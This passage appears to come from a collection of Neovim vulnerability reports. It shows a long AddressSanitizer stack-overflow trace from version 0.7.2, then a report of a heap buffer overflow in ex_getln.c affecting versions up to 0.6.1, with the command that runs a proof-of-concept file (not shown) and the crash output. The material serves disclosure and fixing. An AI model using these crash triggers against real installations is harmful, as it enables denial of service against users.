    #4 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #5 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #6 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #7 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #8 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #9 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #10 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #11 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #12 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #13 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #14 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #15 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #16 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #17 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #18 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #19 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #20 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #21 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #22 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #23 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #24 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #25 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #26 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #27 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #28 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #29 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #30 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #31 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #32 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #33 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #34 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #35 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #36 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #37 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #38 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #39 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #40 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #41 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #42 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #43 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #44 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #45 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #46 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #47 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #48 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #49 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #50 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #51 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #52 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #53 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #54 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #55 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #56 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #57 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #58 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #59 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #60 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #61 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #62 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #63 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #64 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #65 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #66 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #67 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #68 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #69 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #70 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #71 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #72 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #73 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #74 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #75 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #76 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #77 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #78 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #79 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #80 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #81 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #82 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #83 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #84 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #85 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #86 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #87 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #88 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #89 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #90 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #91 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #92 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #93 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #94 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #95 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #96 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #97 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #98 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #99 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #100 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #101 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #102 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #103 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #104 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #105 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #106 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #107 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #108 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #109 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #110 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #111 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #112 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #113 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #114 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #115 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #116 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #117 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #118 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #119 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #120 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #121 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #122 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #123 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #124 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #125 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #126 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #127 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #128 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #129 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #130 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #131 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #132 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #133 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #134 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #135 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #136 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #137 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #138 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #139 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #140 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #141 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #142 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #143 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #144 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #145 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #146 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #147 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #148 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #149 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #150 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #151 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #152 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #153 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #154 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #155 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #156 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #157 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #158 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #159 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #160 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #161 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #162 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #163 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #164 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #165 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #166 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #167 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #168 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #169 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #170 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #171 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #172 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #173 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #174 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #175 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #176 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #177 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #178 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #179 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #180 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #181 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #182 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #183 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #184 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #185 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #186 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #187 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #188 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #189 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #190 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #191 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #192 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #193 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #194 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #195 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #196 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #197 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #198 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #199 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #200 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #201 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #202 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #203 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #204 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #205 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #206 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #207 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #208 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #209 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #210 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #211 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #212 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #213 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #214 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #215 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #216 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #217 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #218 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #219 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #220 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #221 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #222 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #223 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #224 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #225 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #226 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #227 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #228 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #229 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #230 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #231 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #232 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #233 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #234 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #235 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #236 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #237 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #238 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #239 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #240 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #241 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #242 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #243 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3
    #244 0xd95fec in getcmdline /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:2422:10
    #245 0x137993c in get_expr_register /root/vuln/nvims/neovim-0.7.2/src/nvim/ops.c:730:14
    #246 0xdd47d4 in command_line_execute /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1362:14
    #247 0x19cab17 in state_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/state.c:89:26
    #248 0xd9a78a in command_line_enter /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:926:3

SUMMARY: AddressSanitizer: stack-overflow /root/vuln/nvims/neovim-0.7.2/src/nvim/ex_getln.c:1890:5 in command_line_handle_key
==3188954==ABORTING
```

# 20. Neovim <=0.6.1 Heap Buffer Overflow in `src/nvim/ex_getln.c`

## Description
Neovim versions up to and including 0.6.1 are affected by a vulnerability where a heap buffer overflow occurs in the `ex_getln.c` file at line 786. This issue is triggered when processing specially crafted input, such as a file or command, that causes the application to write beyond the bounds of a heap-allocated buffer. The vulnerability could be exploited by an attacker to cause a denial of service (DoS) condition.

## PoC
poc at [C220359](./C220359).
```sh
$ ./nvims/neovim-0.6.1/build/bin/nvim -u NONE -i NONE -e -n -m -X -s -S ./C220359 -c :qa! 
=================================================================
==3188033==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6120000014ce at pc 0x0000004e463c bp 0x7fffbc1cee70 sp 0x7fffbc1ce638
WRITE of size 800 at 0x6120000014ce thread T0
    #0 0x4e463b in __asan_memset (/root/vuln/nvims/neovim-0.6.1/build/bin/nvim+0x4e463b)
    #1 0xd25a08 in command_line_enter /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:786:5
    #2 0xd240b9 in getcmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:2406:20
    #3 0xd2b105 in getexline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_getln.c:2583:10
    #4 0xbec760 in ex_append /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds.c:2978:17
    #5 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #6 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #7 0x1247fe8 in nv_colon /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:4821:18
    #8 0x123389c in normal_execute /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:1164:3
    #9 0x122be42 in normal_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/normal.c:8424:9
    #10 0xcbd6e0 in exec_normal /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8732:5
    #11 0xcbd3ee in exec_normal_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8715:3
    #12 0xcea50f in ex_normal /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:8641:7
    #13 0xc79f8f in do_one_cmd /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:1983:5
    #14 0xc646a5 in do_cmdline /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_docmd.c:604:20
    #15 0xc4ed63 in do_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:2242:5
    #16 0xc49dac in cmd_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1805:14
    #17 0xc4a4a3 in ex_source /root/vuln/nvims/neovim-0.6.1/src/nvim/ex_cmds2.c:1786:3
